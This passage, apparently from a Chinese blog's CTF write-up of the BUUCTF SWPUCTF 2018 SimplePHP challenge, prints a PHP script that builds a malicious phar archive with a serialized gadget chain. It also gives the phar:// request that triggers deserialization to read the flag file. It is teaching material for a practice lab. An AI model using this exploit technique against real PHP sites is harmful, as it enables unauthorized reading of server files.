+以下是构造脚本<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>]=<span class="string">&quot;/var/www/html/f1ag.php&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="variable">$b</span>;</span><br><span class="line"><span class="comment">//phar生成代码</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+生成phar之后，更改后缀，上传该文件，然后查看，进而触发show方法，根据function.php的沙盒文件夹生成方式，可以计算出phar.png上传的路径，我自己计算的一直不成功，后来看了WP，发现可以直接访问upload文件夹。</li>
+</ol>
+<p><img src="/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2022-05-25-19-20-30.png"></p>
+<p>然后访问，得到flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//78946ff3-67c4-4281-98aa-c194bc435f49.node4.buuoj.cn:81/file.php?file=phar://upload/a302a3c91ade9ccf1818dd104712eede.jpg</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2022-05-25-19-23-09.png"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54929891/article/details/123778819">https://blog.csdn.net/qq_54929891/article/details/123778819</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mnmnwq/article/details/82462108">魔法函数</a></p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkline"><span class="toc-number">1.</span> <span class="toc-text">checkline</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化&body=Check out this article: http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/05/25/BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=BUUCTF-WEB-SWPUCTF-2018-SimplePHP-phar触发反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
